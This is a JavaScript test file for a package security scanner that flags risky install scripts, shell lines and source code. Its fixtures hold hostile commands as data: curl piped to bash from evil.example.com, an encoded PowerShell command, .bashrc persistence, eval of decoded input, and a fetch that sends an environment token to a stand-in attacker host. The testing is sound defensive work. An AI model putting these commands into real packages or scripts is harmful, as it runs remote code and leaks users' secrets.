import { test } from "node:test";
import assert from "node:assert/strict";
import {
  scanManifest, scanShell, scanSource, scanNetworkUrls,
  runSecurityScan, hasVetoFinding, NET_ALLOWLIST,
} from "../lib/security.js";

test("manifest: curl|bash install script is critical", () => {
  const f = scanManifest(JSON.stringify({ scripts: { postinstall: "curl -s http://evil.example.com/x | bash" } }));
  assert.ok(f.some((x) => x.rule === "pipe-remote-to-shell" && x.severity === "critical"));
  assert.ok(f.some((x) => x.rule === "install-script")); // runs code at install time
});

test("manifest: encoded powershell command is critical", () => {
  const f = scanManifest(JSON.stringify({ scripts: { install: "powershell -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQApAA==" } }));
  assert.ok(f.some((x) => x.rule === "encoded-command" && x.severity === "critical"));
});

test("manifest: rc persistence is critical, chmod is medium", () => {
  const f = scanManifest(JSON.stringify({ scripts: { postinstall: "echo alias x >> ~/.bashrc && chmod +x ./tool" } }));
  assert.ok(f.some((x) => x.rule === "rc-persistence" && x.severity === "critical"));
  assert.ok(f.some((x) => x.rule === "chmod-exec" && x.severity === "medium"));
});

test("manifest: no scripts is clean", () => {
  assert.deepEqual(scanManifest(JSON.stringify({ name: "x", version: "1.0.0" })), []);
});

test("manifest: invalid JSON is medium, not a crash", () => {
  const f = scanManifest("{not json");
  assert.ok(f.some((x) => x.rule === "manifest-invalid"));
});

test("shell: remote pipe and base64 decode are critical", () => {
  const f = scanShell("curl https://evil.example.com/run.sh | sh", "scripts/setup.sh");
  assert.ok(f.some((x) => x.rule === "pipe-remote-to-shell" && x.severity === "critical"));
  const f2 = scanShell("echo aGVsbG8= | base64 -d | bash", "x.sh");
  assert.ok(f2.some((x) => x.rule === "encoded-command" && x.severity === "critical"));
});

test("source: eval is high, env+exfil is high, allowlisted host is ignored", () => {
  const clean = scanSource("fetch(\"https://registry.npmjs.org/dsh-browser\"); const k = process.env.API_KEY;", "lib/index.js");
  assert.ok(!clean.some((x) => x.rule === "net-callback")); // allowlisted
  assert.ok(clean.some((x) => x.rule === "env-read" && x.severity === "info"));
  const evil = scanSource("eval(atob(\"aGVsbG8=\")); fetch(\"https://evil.example.com/beacon?id=\" + process.env.TOKEN);", "lib/index.js");
  assert.ok(evil.some((x) => x.rule === "eval" && x.severity === "high"));
  assert.ok(evil.some((x) => x.rule === "net-callback" && x.severity === "medium"));
  assert.ok(evil.some((x) => x.rule === "env-exfil" && x.severity === "high"));
});

test("network urls: telegram host is high", () => {
  const f = scanNetworkUrls("fetch(\"https://api.telegram.org/bot123/sendMessage\")", "x.js");
  assert.ok(f.some((x) => x.rule === "net-callback" && x.severity === "high"));
});

test("runSecurityScan aggregates, dedupes, and computes trust score", () => {
  const files = [
    { path: "package.json", text: JSON.stringify({ scripts: { postinstall: "curl -s http://evil.example.com/x | bash" } }) },
    { path: "package.json", text: JSON.stringify({ scripts: { postinstall: "curl -s http://evil.example.com/x | bash" } }) }, // dup
    { path: "lib/index.js", text: "fetch(\"https://evil.example.com/api\");" },
  ];
  const { findings, trustScore } = runSecurityScan(files);
  const uniq = new Set(findings.map((f) => f.rule + "|" + f.detail));
  assert.equal(findings.length, uniq.size); // deduped
  assert.ok(findings.some((f) => f.severity === "critical"));
  assert.ok(trustScore < 100);
  assert.ok(hasVetoFinding(findings));
});

test("allowlist is exported and sane", () => {
  assert.ok(NET_ALLOWLIST.includes("api.deepseek.com"));
});
